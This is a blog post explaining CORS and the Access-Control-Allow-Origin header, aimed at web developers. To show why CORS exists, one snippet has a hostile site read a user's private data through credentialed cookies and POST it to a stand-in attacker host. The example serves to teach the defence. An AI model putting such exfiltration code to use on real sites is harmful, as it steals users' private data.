---
layout: blog
title: "CORS: Access-Control-Allow-Origin whut?!"
draft: false
date: 2023-11-21T17:45:00.000Z
date_updated: 2023-11-21T17:45:00.000Z
featured_image: /media/uploads/tanja-cotoaga-hvcXgf9rYKc-unsplash.jpg
page_bg: linear-gradient(to right,#c0a3c7,#3a60d3)
excerpt: CORS can seem like a super tricky and complex topic to wrap your head around, but in reality, it's not as hard as it appears.
---
## A Summary

CORS restrictions are a way of telling a user's browser that data should be protected from code running on a website, and asking the browser to place restrictions on that code to keep the data safe.

## Understanding the problem

*This section will explain the problem that CORS restrictions were invented to resolve. Feel free to skip this if you're happy that you understand why CORS is important.*

Imagine you have a website, let's call it `example.com`. You want to load some data from your API. How would you do it?

You might decide to do something like this.
```js
const data = await fetch('https://example.com/api/data');
```
This is great. Simple, and it works. Now let's imagine you add authentication. Let's say you implement some kind of API key. What would your fetch look like now?
```js
const myToken = '5Up3Rs3cr374PiK3Y';
const data = await fetch('https://example.com/api/data', {
  headers:  {
    Authorization: 'Bearer ' + myToken
  }
});
```
Cool. That works nicely. But then I decide to set up some more complex authentication and everyone has their own token. Maybe it's just easier to store that as a cookie? That's going to make it a lot easier, because now I can do this again:
```js
const data = await fetch('https://example.com/api/data');
```
My browser *automatically knows* to attach cookies from `example.com` to every request.

Great, so now I'm cooking with gas, I can fetch data from my API super easily.

But now I decide that for some reason I need to move my API to a different server, and that server is going to be hosted at `api.example`.

Now I can update my fetch to 
```js
const data = await fetch('https://api.example/api/data');
```
All good, users have to sign in again because the cookies from `example.com` don't get sent to `api.example`, but otherwise, everything is going smoothly.
Except wait, now someone has set up a site called `stolen-content.example`. I check their code, and they're just using my back-end for their own purposes!

*How to protect your users from credential theft will be the topic of another post in future, but for now, please just assume that your backend is configured properly to stop your users' authentication cookies leaking.*

But it gets worse, I find out that they're requesting data which is private for my users!:
```js
const data = await fetch('https://api.example/api/my_users_secret_data');
```
And my server is happily sending the data, because the user is sending a credentialled request!

Oh no, it's even worse than I thought... look at the next line:
```js
const data = await fetch('https://api.example/api/my_users_secret_data');
const json = await data.json();
fetch('https://stolen_content.example/save_secret_data', {
  method: POST,
  body: JSON.stringify(json)
});
```
They're  saving our users' data to their own database! How can we stop them?!

## CORS
Browser developers realised that the above problem is something that it's difficult for an application developer to stop. The browser is issuing a request with a legitimate cookie attached to it. How could the application know that it's being done with malicious intent? The real underlying problem here is that the end user, who is just trying to browse the internet is executing code on their browser that they don't understand, and that could be written by anyone.

So how do we protect users from the code that they're running? Enter CORS. Browser developers told application developers that they will implement some logic that application developers can rely on.  The application developer can tell the browser where they want to allow their requests to come from. This is the `Access-Control-Allow-Origin` header.

Here are some examples:
```
Access-Control-Allow-Origin: *
// This data can be requested by anyone
Access-Control-Allow-Origin: https://example.com
// This data should only be requested by people browsing https://example.com
```

Now, if a user is on `stolen-content.example` and their browser requests data from my API, then their request will fail with a CORS error, and the code to steal the users' secret data will fail.

*Note that all of this assumes that the user's browser properly respects the CORS header, and that we don't have to worry about the user using a compromised browser, and nor do we have to worry about the user trying to steal their own information. CORS only solves the problem of untrusted developers being allowed to run code on your computer through your browser, potentially with access to secret information.*

## Further reading
CORS actually has some other sensible protections (for example, you can't use `Access-Control-Allow-Origin: *` with a credentialled request, you can tell the browser not to share headers or not to allow specific methods, etc.). I'd recommend you start with [the MDN docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin).
